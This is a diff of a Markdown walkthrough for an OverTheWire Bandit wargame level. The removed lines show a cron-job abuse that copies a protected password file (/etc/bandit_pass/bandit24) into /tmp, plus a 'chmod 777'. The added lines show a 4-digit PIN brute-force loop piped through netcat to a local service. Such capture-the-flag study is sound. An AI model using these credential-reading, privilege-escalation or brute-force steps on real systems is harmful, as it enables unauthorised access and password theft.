@@ -32,60 +32,52 @@ ls -la
 
 **Step 2:**
 <br>
-
-<br>
-(Sends what 'cronjob_bandit24' has in it.)
-
-**Step 3:**
-<br>
-cat /usr/bin/cronjob_bandit24.sh
-<br>
-(Sends what 'cronjob_bandit24.sh' has in it.)
-
-**Step 4:**
-<br>
 mktemp -d
 <br>
 ('mktemp -d' makes a Temporary Directory, example: '/tmp/tmp.DuzEylipfd')
 
-**Step 5:**
+**Step 3:**
 <br>
 cd /tmp/tmp."Temporary Directory"
 <br>
 ("Temporary Directory" is from 'mktemp -d')
 
-**Step 6:**
+**Step 4:**
 <br>
 nano 'whatever name you want of the file'.sh
 <br>
 ('nano' is  a  small  and friendly editor. 'whatever name you want of the file' means name it however you like with a '.sh' at the end.)
 
-*Step 7:**
+**Step 5:**
 <br>
 #!/bin/bash
-cat /etc/bandit_pass/bandit24 > /tmp/tmp."Temporary Directory"/password.txt
+
+for i in {0000..9999}
+<br>
+do
+<br>
+       echo XXXXXXXXXXXXXXXXXXXXXXXXXXXGGar $i >> possibilities.txt
+<br>
+done
 <br>
 (Do this after getting in to the 'nano' for the file, don't forget to save the 'nano' before exiting.)
 
-**Step 8:**
+**Step 6:**
 <br>
 chmod +x 'whatever name you want of the file'.sh
 <br>
 ('chmod +x' gives permissions to files or directorys for everyone.)
 
-**Step 9:**
+*Step 7:**
 <br>
-chmod 777 .
+./'whatever name you want of the file'.sh
 <br>
-('chmod 777' gives permissions to read, write and execute for everyone. If that doesn't work try 'chmod +w')
+(Gives a little time lag.)
 
-**Step 10:**
+**Step 8:**
 <br>
-cp 'whatever name you want of the file'.sh /var/spool/bandit24/
+cat possibilities.txt | nc localhost 30002
 <br>
-('cp' copies 'whatever name you want of the file.sh' to '/var/spool/bandit24/' which was from Step 3.)
-<br>
-(Wait a minute or less to see a file called 'password.txt' from Step 7, if not then check the 'whatever name you want of the file'.sh for miss spelling.)
 
 *Fast way to logging in:*
 <br>
